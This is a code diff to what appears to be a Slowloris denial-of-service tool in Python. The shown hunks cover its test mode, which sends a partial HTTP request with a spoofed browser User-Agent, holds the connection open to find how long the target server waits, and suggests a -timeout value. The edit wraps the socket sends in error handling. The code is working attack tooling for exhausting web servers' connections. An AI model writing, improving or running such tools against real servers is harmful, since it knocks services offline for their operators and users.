@@ -207,12 +207,15 @@ if args.test:
 		primarypayload += "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
 		primarypayload += "Content-Length: 42\r\n"
 
-		if sock.send(primarypayload.encode("utf-8")):
-			print("Connection successful, now comes the waiting game...")
-		else:
-			print("That's odd - I connected but couldn't send the data to {}:{}.".format(args.host, args.port))
-			print("Is something wrong?\nDying.")
-			sys.exit()
+		try:
+			if sock.send(primarypayload.encode("utf-8")):
+				print("Connection successful, now comes the waiting game...")
+			else:
+				print("That's odd - I connected but couldn't send the data to {}:{}.".format(args.host, args.port))
+				print("Is something wrong?\nDying.")
+				sys.exit()
+		except socket.error:
+			pass
 	else:
 		print("Uhm... I can't connect to {}:{}.".format(args.host, args.port))
 		print("Is something wrong?\nDying.")
@@ -232,13 +235,16 @@ if args.test:
 		except socket.error:
 			delay = times[i-1]
 			break
-
-	if sock.send(b"Connection: Close\r\n\r\n"):
-		print("Okay that's enough time. Slowloris closed the socket.")
-		print("Use {} seconds for -timeout.".format(delay))
-	else:
-		print("Remote server closed socket.")
-		print("Use {} seconds for -timeout.".format(delay))
+			
+	try:
+		if sock.send(b"Connection: Close\r\n\r\n"):
+			print("Okay that's enough time. Slowloris closed the socket.")
+			print("Use {} seconds for -timeout.".format(delay))
+		else:
+			print("Remote server closed socket.")
+			print("Use {} seconds for -timeout.".format(delay))
+	except socket.error:
+		pass
 
 	if delay < 166:
 		print("""
